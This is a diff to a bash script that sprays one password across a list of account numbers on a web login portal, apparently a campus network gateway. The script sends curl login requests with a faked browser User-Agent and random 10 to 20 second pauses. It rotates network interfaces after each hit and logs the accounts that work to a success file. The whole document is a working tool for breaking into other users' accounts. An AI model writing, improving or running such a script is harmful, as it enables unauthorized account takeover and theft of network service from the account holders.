@@ -1,10 +1,24 @@
 #!/usr/bin/env bash
 
+log_file_name="log.txt"
+numbers_file_name="numbers.txt"
+success_number_file_name="success.txt"
+
 current_if=""
+
+host=$(cat host.txt)
+account_prefix=$(cat account_prefix.txt)
+password=$(cat password.txt)
+
 
 log() {
     current_time=$(date "+%Y/%m/%d %T")
-    echo "$current_time" "$1"
+    echo "$current_time" "$1" >> "$log_file_name"
+}
+
+log_success () {
+    current_time=$(date "+%Y/%m/%d %T")
+    echo "$current_time" "$1" >> "$success_number_file_name"
 }
 
 choose_if() {
@@ -40,25 +54,24 @@ choose_if() {
 choose_if
 
 login() {
-    curl "http://<some_addr>/login?DDDDD=$1&upass=$2&R1=0&R2=&R3=2&R6=0&para=00&0MKKey=123456&buttonClicked=&redirect_url=&err_flag=&username=&password=&user=&cmd=&Login=&v6ip=" \
+    curl "http://$host/login?DDDDD=$1&upass=$2&R1=0&R2=&R3=2&R6=0&para=00&0MKKey=123456&buttonClicked=&redirect_url=&err_flag=&username=&password=&user=&cmd=&Login=&v6ip=" \
         -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
         -H 'Accept-Language: zh-CN,zh;q=0.9' \
         -H 'Connection: keep-alive' \
-        -H 'Referer: http://<some_addr>/a70.htm?isReback=1' \
+        -H 'Referer: http://'$host'/a70.htm?isReback=1' \
         -H 'Upgrade-Insecure-Requests: 1' \
         -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36' \
         -i -s --interface "$3"
 }
 
-while true; do
-    sleep_time=$((RANDOM % 50 + 20))
+while IFS= read -r number; do
+    sleep_time=$((RANDOM % 10 + 10)) # 10 - 20
     sleep $sleep_time
 
-    account=<some_number>$((RANDOM % 8999 + 1000))
-    password=<some_password>
+    account=$account_prefix$number
 
     log "using account: $account, password $password"
-    response=$(login $account $password $current_if)
+    response=$(login "$account" "$password" "$current_if")
 
     length=$(echo "$response" | grep -i 'Content-length:')
 
@@ -70,6 +83,7 @@ while true; do
 
         elif [[ "$length" =~ Content-length:[[:space:]](4[0-9]*) ]]; then # login success
             log "length: ${BASH_REMATCH[1]}, login success"
+            log_success "$account"
             choose_if
             continue
 
@@ -84,4 +98,4 @@ while true; do
         log "no content length header found: $response"
     fi
 
-done
+done < "$numbers_file_name"
